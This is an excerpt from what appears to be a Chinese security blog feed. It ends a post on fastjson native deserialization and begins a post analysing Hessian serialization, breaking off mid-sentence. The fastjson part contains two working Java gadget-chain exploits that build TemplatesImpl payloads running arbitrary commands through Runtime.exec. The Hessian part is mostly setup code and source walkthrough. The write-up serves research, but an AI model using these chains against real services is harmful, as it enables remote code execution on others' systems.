Exception&#123;<br>        <span class="hljs-comment">//生成恶意类</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        <span class="hljs-type">byte</span>[][] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, bytes);<br>        setValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;clown&quot;</span>);<br>        setValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br><br>        ArrayList&lt;Object&gt; arrayList=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>        arrayList.add(templates);<br><br>        <span class="hljs-type">JSONArray</span> <span class="hljs-variable">jsonArray</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>();<br>        jsonArray.add(templates);<br><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">valfield</span> <span class="hljs-operator">=</span> val.getClass().getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        valfield.setAccessible(<span class="hljs-literal">true</span>);<br>        valfield.set(val, jsonArray);<br><br>        arrayList.add(val);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        objectOutputStream.writeObject(arrayList);<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object)ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410111703825.png" alt="image-20241011170336723"></p><blockquote><p>这里一开始我自己写直接简单粗暴arraylist加了两次，然后把arraylist放JSONArray里，导致打不通，后来一想都放里面的话有一个会不是引用类型，导致他经过resolveClass之后会提前抛出异常，所以我们无论是List还是Map，都是要包裹在外面的，使其第一个类反序列化的时候不经过resolveClass</p></blockquote><p>文章的HashMap的版本</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.Own;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONArray;<br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">fastjson1Usual1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] genPayload(String cmd) <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;&quot;</span>+cmd+<span class="hljs-string">&quot;\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        clazz.getClassFile().setMajorVersion(<span class="hljs-number">49</span>);<br>        <span class="hljs-keyword">return</span> clazz.toBytecode();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br><br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;genPayload(<span class="hljs-string">&quot;calc&quot;</span>)&#125;);<br>        setValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>);<br>        setValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br><br>        <span class="hljs-type">JSONArray</span> <span class="hljs-variable">jsonArray</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>();<br>        jsonArray.add(templates);<br><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">bd</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        setValue(bd,<span class="hljs-string">&quot;val&quot;</span>,jsonArray);<br><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        hashMap.put(templates,bd);<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>        objectOutputStream.writeObject(hashMap);<br>        objectOutputStream.close();<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray()));<br>        objectInputStream.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;看了fastjson的各版本链子，再看一下fastjson的原生反序列化，看的是y4师傅的两篇文章&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://y4tacker.github.io/2023/03/20/year/2023/3/FastJson%E4%B8%8E%E5%</summary>
      
    
    
    
    <category term="java" scheme="https://clowsman.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
    <category term="反序列化" scheme="https://clowsman.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>Hessian反序列化</title>
    <link href="https://clowsman.github.io/2024/10/08/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://clowsman.github.io/2024/10/08/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2024-10-08T09:21:49.000Z</published>
    <updated>2024-10-10T14:57:50.438Z</updated>
    
    <content type="html"><![CDATA[<p>来学一下Hessian反序列化，主要参考su18师傅的文章：</p><h1 id="hessian简介"><a href="#Hessian简介" class="headerlink" title="Hessian简介"></a>Hessian简介</h1><p>直接抄su18师傅里面的</p><p>Hessian 是 <a href="https://caucho.com/">caucho</a> 公司的工程项目，为了达到或超过 ORMI&#x2F;Java JNI 等其他跨语言&#x2F;平台调用的能力设计而出，在 2004 点发布 1.0 规范，一般称之为 Hessian ，并逐步迭代，在 Hassian jar 3.2.0 之后，采用了新的 2.0 版本的协议，一般称之为 Hessian 2.0。</p><p>这是一种动态类型的<a href="http://hessian.caucho.com/doc/hessian-serialization.html">二进制序列化</a>和 <a href="http://hessian.caucho.com/doc/hessian-ws.html">Web 服务</a>协议，专为面向对象的传输而设计。Hessian 协议在设计时，重点的几个目标包括了：必须尽可能的快、必须尽可能紧凑、跨语言、不需要外部模式或接口定义等等。</p><p>对于这样的设计，caucho 公司其实提供了两种解决方案，一个是 Hessian，一个是 Burlap。Hession 是基于二进制的实现，传输数据更小更快，而 Burlap 的消息是 XML 的，有更好的可读性。两种数据都是基于 HTTP 协议传输。</p><p>Hessian 本身作为 <a href="https://caucho.com/products/resin">Resin</a> 的一部分，但是它的 <code>com.caucho.hessian.client</code> 和 <code>com.caucho.hessian.server</code> 包不依赖于任何其他的 Resin 类，因此它也可以使用任何容器如 Tomcat 中，也可以使用在 EJB 中。事实上很多通讯框架都使用或支持了这个规范来序列化及反序列化类。</p><p>作为一个二进制的序列化协议，Hessian 自行定义了一套自己的储存和还原数据的机制。对 8 种基础数据类型、3 种递归类型、ref 引用以及 Hessian 2.0 中的内部引用映射进行了相关定义。这样的设计使得 Hassian 可以进行跨语言跨平台的调用。</p><p>有关Hessian协议和其他协议的对比以及反序列化原理可以看这篇文章：<a href="https://blog.csdn.net/ByteDanceTech/article/details/126188189">https://blog.csdn.net/ByteDanceTech/article/details/126188189</a></p><h1 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a>简单使用</h1><p>su18师傅的文章里面提供了多种使用方式，这里来复刻一下</p><h2 id="基于servlet"><a href="#基于Servlet" class="headerlink" title="基于Servlet"></a>基于Servlet</h2><p>定义一个方法接口</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.hessianservlet;<br><br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Greeting</span> &#123;<br>    String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(HashMap o)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>服务端创建该方法的具体实现，并继承com.caucho.hessian.server.HessianServlet来将其标记为一个提供服务的Servlet</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.hessianservlet;<br><br><span class="hljs-keyword">import</span> com.caucho.hessian.server.HessianServlet;<br><br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.*;<br><br><span class="hljs-meta">@WebServlet(name = &quot;hessian&quot;, value = &quot;/hessian&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HessianServlet</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Greeting</span> &#123;<br>    <span class="hljs-keyword">private</span> String message;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(HashMap o)</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello &quot;</span>+o.toString();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后需要配置Servlet映射，我这里直接用了注解，也可以用web.xml来配置</p><p>Client 端通过 <code>com.caucho.hessian.client.HessianProxyFactory</code> 工厂类创建对接口的代理对象，并进行调用，可以看到调用后执行了服务端的逻辑并返回了结果。</p><blockquote><p>这一部分和RMI的远程调用类似，都是通过代理创建对象来执行方法的，等会分析源码的时候也会看到</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.hessianservlet;<br><br><span class="hljs-keyword">import</span> com.caucho.hessian.client.HessianProxyFactory;<br><br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> MalformedURLException, ClassNotFoundException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://localhost:8080/HessianServlet_war_exploded/hessian&quot;</span>;<br>        <span class="hljs-type">HessianProxyFactory</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianProxyFactory</span>();<br>        <span class="hljs-type">Greeting</span> <span class="hljs-variable">greeting</span> <span class="hljs-operator">=</span> (Greeting) factory.create(Greeting.class, url);<br>        HashMap&lt;Object, Object&gt; object = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        object.put(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;a&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;Hessian Call: &quot;</span>+greeting.sayHello(object));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410091058542.png" alt="image-20241009105834433"></p><p>这里Hessian并不需要像RMI那样接口的包名需要相同。</p><h2 id="基于spring"><a href="#基于Spring" class="headerlink" title="基于Spring"></a>基于Spring</h2><p>Spring-web 包内提供了 <code>org.springframework.remoting.caucho.HessianServiceExporter</code> 用来暴露远程调用的接口和实现类。使用该类 export 的 Hessian Service 可以被任何 Hessian Client 访问，因为 Spring 中间没有进行任何特殊处理。</p><p>从 spring-web-5.3 后，该类被标记为 <code>@Deprecated</code> ， 也就是说 spring 在逐渐淘汰对基于序列化的远程调用的相关支持。</p><blockquote><p>我这里一开始springboot3里面的spring-web是6.1.13的版本，是直接连HessianServiceExporter这个类也找不到了</p></blockquote><p>这里就不尝试了，copy一下官方文档的代码示例：<a href="https://www.baeldung.com/spring-remoting-hessian-burlap">https://www.baeldung.com/spring-remoting-hessian-burlap</a></p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Bean(name = &quot;/booking&quot;)</span> <br>RemoteExporter <span class="hljs-title function_">bookingService</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">HessianServiceExporter</span> <span class="hljs-variable">exporter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianServiceExporter</span>();<br>    exporter.setService(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CabBookingServiceImpl</span>());<br>    exporter.setServiceInterface( CabBookingService.class );<br>    <span class="hljs-keyword">return</span> exporter;<br>&#125;<br></code></pre></td></tr></table></figure><p>这是暴露服务的代码，客户端同样用前面的即可，只需要改一下url</p><p>他还有使用Burlap协议的写法</p><p>暴露服务：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Bean(name = &quot;/booking&quot;)</span> <br>RemoteExporter <span class="hljs-title function_">burlapService</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">BurlapServiceExporter</span> <span class="hljs-variable">exporter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BurlapServiceExporter</span>();<br>    exporter.setService(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CabBookingServiceImpl</span>());<br>    exporter.setServiceInterface( CabBookingService.class );<br>    <span class="hljs-keyword">return</span> exporter;<br>&#125;<br></code></pre></td></tr></table></figure><p>客户端：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Bean</span><br><span class="hljs-keyword">public</span> BurlapProxyFactoryBean <span class="hljs-title function_">burlapInvoker</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">BurlapProxyFactoryBean</span> <span class="hljs-variable">invoker</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BurlapProxyFactoryBean</span>();<br>    invoker.setServiceUrl(<span class="hljs-string">&quot;http://localhost:8080/booking&quot;</span>);<br>    invoker.setServiceInterface(CabBookingService.class);<br>    <span class="hljs-keyword">return</span> invoker;<br>&#125;<br></code></pre></td></tr></table></figure><p>写法基本和使用hessian一致</p><h2 id="自封装调用"><a href="#自封装调用" class="headerlink" title="自封装调用"></a>自封装调用</h2><p>就是通过对 <code>HessianInput/HessianOutput</code>、<code>Hessian2Input/Hessian2Output</code>、<code>BurlapInput/BurlapOutput</code> 的相关方法的封装，可以自行实现传输、存储等逻辑，使用 Hessian 进行序列化和反序列化数据。</p><p>这里的Input和Output方法就是直接进行序列化和反序列化的方法，前面的调用也都是对这些方法进行了封装，Output就是序列化出去，Input就是反序列化</p><p>Input方法都继承自AbstractHessianInput这个抽象类</p><p><img src="https://cdn.clown2024.cn/202410091608295.png" alt="image-20241009160850197"></p><p>Output方法则继承AbstractHessianOutput抽象类</p><p><img src="https://cdn.clown2024.cn/202410091609188.png" alt="image-20241009160949153"></p><p>这里封装成一个工具类</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.hessianservlet;<br><br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Input;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Output;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HessianUtil</span> &#123;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Hessian序列化</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> obj</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> Exception</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] serialize(Object obj) <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">byte</span>[] result=<span class="hljs-literal">null</span>;<br>        Hessian2Output oo=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Output</span>(bos);<span class="hljs-comment">//封装字节流</span><br>        oo.writeObject(obj);<span class="hljs-comment">//写入序列化对象字节流</span><br>        oo.flush();<br>        result=bos.toByteArray();<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Hessian反序列化</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> bytes</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> Exception</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">deserialize</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes);<br>        Hessian2Input oi=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Input</span>(bis);<br>        <span class="hljs-keyword">return</span> oi.readObject();<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="jndi调用"><a href="#JNDI调用" class="headerlink" title="JNDI调用"></a>JNDI调用</h2><p>Hessian 还可以通过将 HessianProxyFactory 配置为 JNDI Resource 的方式来调用。看文章是用了resin来配置的，我没查到web.xml的配置，截个文章的图知道一下算了</p><p><img src="https://cdn.clown2024.cn/202410091644186.png" alt="image-20241009164415140"></p><h1 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h1><h2 id="接口调用"><a href="#接口调用" class="headerlink" title="接口调用"></a>接口调用</h2><p>那前面的基于Servlet的代码先来分析，HessianServlet是HttpServlet的子类，那么HessianServlet 的<code>init</code> 方法将会承担一些初始化的功能，而 <code>service</code> 方法将会是相关处理的起始位置。</p><p>该类的成员变量</p><p><img src="https://cdn.clown2024.cn/202410091650586.png" alt="image-20241009165055536"></p><p><code>_homeAPI</code>(调用类的接口 Class)、<code>_homeImpl</code>(具体实现类的对象)、<code>_serializerFactory</code>(序列化工厂类)、<code>_homeSkeleton</code>(封装方法)</p><p>看一下init方法</p><p><img src="https://cdn.clown2024.cn/202410091655779.png" alt="image-20241009165531713"></p><p>就是对各变量进行判断是否为空来进行初始化，它里面调用了loadClass方法来加载类，不过他这里自己重写了一个loadClass</p><p><img src="https://cdn.clown2024.cn/202410091716251.png" alt="image-20241009171609208"></p><p><img src="https://cdn.clown2024.cn/202410091716148.png" alt="image-20241009171618113"></p><p>这里优先从线程获取类加载器，应该是为了更快加载到对应的类，避免走双亲委派的流程，线程的默认的类加载器是AppClassLoader</p><p>然后看他的service方法</p><p><img src="https://cdn.clown2024.cn/202410091723880.png" alt="image-20241009172300818"></p><p>可以看到只支持POST请求，获取id或者ejbid作为objectId，然后设置一个响应头，再去调用invoke方法</p><p><img src="https://cdn.clown2024.cn/202410091724012.png" alt="image-20241009172457963"></p><p>然后就根据objectId是否为空来选择调用的方法</p><p>先看一下第一个方法com.caucho.hessian.server.HessianSkeleton#invoke</p><p>该类的父类是AbstractSkeleton，该类对Hessian提供的服务进行封装</p><p><img src="https://cdn.clown2024.cn/202410091929088.png" alt="image-20241009192918042"></p><p>其将方法、方法名等保存在_methodMap里面</p><p><img src="https://cdn.clown2024.cn/202410091932778.png" alt="image-20241009193223729"></p><p>然后HessianSkeleton初始化就将自己的实现类保存在_service变量里面</p><p>该类里面还有两个成员变量要看一下</p><p><img src="https://cdn.clown2024.cn/202410091937552.png" alt="image-20241009193725504"></p><p>两个工厂类，HessianInputFactory就是用来读取和创建HessianInput&#x2F;Hessian2Input 流，HessianFactory用来</p><p>创建HessianInput&#x2F;Hessian2Input&#x2F;HessianOutput&#x2F;Hessian2Output流</p><p>对类基本了解后回过头继续看invoke方法</p><p><img src="https://cdn.clown2024.cn/202410091949119.png" alt="image-20241009194929048"></p><p>一开始调用_inputFactory读取header，然后根据header来创建对应的Input和Output流，最后再invoke调用一次服务</p><p>这里代码比较长就直接截文章里的图了，这个图写了注释</p><p><img src="https://cdn.clown2024.cn/202410092030361.png" alt="image-20241009203055295"></p><p>还有spring的逻辑也差不多看看文章的就好了</p><h2 id="序列化和反序列化细节"><a href="#序列化和反序列化细节" class="headerlink" title="序列化和反序列化细节"></a>序列化和反序列化细节</h2><p>序列化和反序列化的读取、写入就是由我们前面提到过的AbstractHessianInput&#x2F;AbstractHessianOutput这两个抽象类提供，然后Hessian&#x2F;Hessian2&#x2F;Burlap都提供了方法的具体实现</p><p>以Hessian2Output为例子看看序列化的写入</p><p><img src="https://cdn.clown2024.cn/202410092039705.png" alt="image-20241009203934647"></p><p>这里根据具体的类来获取序列化器然后写入序列化数据，可以看一下Serializer的实现类有多少</p><p><img src="https://cdn.clown2024.cn/202410092044894.png" alt="image-20241009204454835"></p><p>对于自定义类型，将会使用 <code>JavaSerializer/UnsafeSerializer/JavaUnsharedSerializer</code> 进行相关的序列化动作，默认情况下是 <code>UnsafeSerializer</code></p><p>看一下UnsafeSerializer#writeObject方法</p><p><img src="https://cdn.clown2024.cn/202410092233208.png" alt="image-20241009223331142"></p><p>这里会调用一个writeObjectBegin方法，该方法是AbstractHessianOutput的</p><p><img src="https://cdn.clown2024.cn/202410092236620.png" alt="image-20241009223618572"></p><p>里面再调用了一个writeMapBegin方法，Hessian2Output 重写了writeObjectBegin这个方法，而其他实现类没有。也就是说在 Hessian 1.0 和 Burlap 中，写入自定义数据类型（Object）时，都会调用 <code>writeMapBegin</code> 方法将其标记为 Map 类型。</p><p>在 Hessian 2.0 中，将会调用 <code>writeDefinition20</code> 和 <code>Hessian2Output#writeObjectBegin</code> 方法写入自定义数据，就不再将其标记为 Map 类型。</p><p>再看反序列化，以Hessian2Input为例</p><p><img src="https://cdn.clown2024.cn/202410092244449.png" alt="image-20241009224448389"></p><p>基本就是一大串的switch case语句，根据标识位进行不同的逻辑处理</p><p><img src="https://cdn.clown2024.cn/202410092309278.png" alt="image-20241009230909226"></p><p>他在反序列化时也会根据类型获取对应的反序列化器</p><p><img src="https://cdn.clown2024.cn/202410092312974.png" alt="image-20241009231208927"></p><p>然后读取自定义类型数据用的是UnsafeDeserializer类，看一下他的readObject方法</p><p><img src="https://cdn.clown2024.cn/202410092315911.png" alt="image-20241009231538854"></p><p><img src="https://cdn.clown2024.cn/202410092320613.png" alt="image-20241009232015561"></p><p>创建Unsafe类实例，然后反序列化读取Field并反射写入</p><p><img src="https://cdn.clown2024.cn/202410092320165.png" alt="image-20241009232019114"></p><p>Hessian 1.0 的 HessianInput 中，没有针对 Object 的读取，而是都将其作为 Map 读取，因为在序列化的过程中我们也提到，在写入自定义类型时会将其标记为 Map 类型。</p><p><code>MapDeserializer#readMap</code> 方法提供了针对 Map 类型数据的处理逻辑</p><p><img src="https://cdn.clown2024.cn/202410092327669.png" alt="image-20241009232731601"></p><h2 id="远程调用"><a href="#远程调用" class="headerlink" title="远程调用"></a>远程调用</h2><p>还是根据前面的客户端代码来调试，根据create方法一路往下</p><p><img src="https://cdn.clown2024.cn/202410092353919.png" alt="image-20241009235359859"></p><p>在这里创建了动态代理，我们知道动态代理调用方法时会走InvocationHandler#invoke方法，我们去看一下</p><p><img src="https://cdn.clown2024.cn/202410100001263.png" alt="image-20241010000103202"></p><p>这里是处理相关方法调用，再往后就是发送请求结果并反序列化，截一下文章的图</p><p><img src="https://cdn.clown2024.cn/202410100008161.png" alt="image-20241010000832095"></p><h2 id="其他实现细节"><a href="#其他实现细节" class="headerlink" title="其他实现细节"></a>其他实现细节</h2><p><strong>协议版本</strong></p><p>使用那种协议进行序列化和反序列化取决于请求标志位</p><p>这一设定位于 <code>HessianProxyFactory</code> 中的两个布尔型变量中，即 <code>_isHessian2Reply</code> 和 <code>_isHessian2Request</code></p><p><img src="https://cdn.clown2024.cn/202410100012841.png" alt="image-20241010001231800"></p><p>想更改协议自己set方法设置即可</p><p><strong>Serializable</strong></p><p>我们知道在Java 原生反序列化中，实现了 <code>java.io.Serializable</code> 接口的类才可以反序列化</p><p>Hessian在获取默认序列化器的时候会检查是否实现了Serializable接口</p><p><img src="https://cdn.clown2024.cn/202410100020094.png" alt="image-20241010002017043"></p><p>但是注意这里有一个_isAllowNonSerializable变量，它可以打破这种规范，我们只要用set方法将他设置为true，这样没有实现Serializable接口的类也能序列化</p><p>然后是 transient 和 static 的问题，在序列化时，由 <code>UnsafeSerializer#introspect</code> 